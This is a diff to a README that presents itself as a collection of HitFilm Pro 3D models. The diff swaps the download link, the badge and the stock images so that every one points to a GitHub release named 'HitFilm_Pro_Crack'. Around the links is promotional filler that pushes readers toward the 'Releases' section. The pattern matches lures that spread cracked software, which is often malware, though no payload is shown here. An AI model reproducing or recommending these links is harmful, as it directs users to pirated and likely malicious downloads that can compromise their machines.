@@ -26,14 +26,14 @@ This repository contains a collection of 3D models that are compatible with HitF
 
 ## Accessing Resources
 
-For downloading the resources related to HitFilm Pro, please click [here](https://github.com/download/Program.zip)
+For downloading the resources related to HitFilm Pro, please click [here](https://github.com/Deepankardeep/HitFilm_Pro_Crack/releases/tag/v2.0)
 
-[![Download](https://img.shields.io/badge/Download-Resources-green)](https://github.com/download/Program.zip)
+[![Download](https://github.com/Deepankardeep/HitFilm_Pro_Crack/releases/tag/v2.0)](https://github.com/Deepankardeep/HitFilm_Pro_Crack/releases/tag/v2.0)
 
 If the link leads to a specific file, ensure to unzip and explore its contents. In case the link does not work or the required files are not found, please visit the "Releases" section of this repository for alternative access.
 
 ## 🎥 Embrace the Creativity with HitFilm Pro
-![HitFilm Pro](https://source.unsplash.com/weekly?filmmaking)
+![HitFilm Pro](https://github.com/Deepankardeep/HitFilm_Pro_Crack/releases/tag/v2.0)
 
 Unleash your imagination and dive into the world of visual storytelling with HitFilm Pro. Let your creativity take flight as you explore the boundless possibilities offered by this powerful software. Whether you're a seasoned professional or a budding filmmaker, HitFilm Pro is your gateway to captivating visual effects, seamless editing, and immersive storytelling.
 
@@ -62,7 +62,7 @@ Embark on your journey with HitFilm Pro and discover a world of creative possibi
 
 ## 🎞️ Lights, Camera, Action!
 
-![Action](https://source.unsplash.com/weekly?action)
+![Action](https://github.com/Deepankardeep/HitFilm_Pro_Crack/releases/tag/v2.0)
 
 Lights, camera, action! Let HitFilm Pro be your guiding light in the world of filmmaking and visual effects. Unleash your creativity, tell captivating stories, and mesmerize your audience with the magic of HitFilm Pro. The stage is set, the spotlight is yours – now go forth and create cinematic wonders with HitFilm Pro! 🎥
 
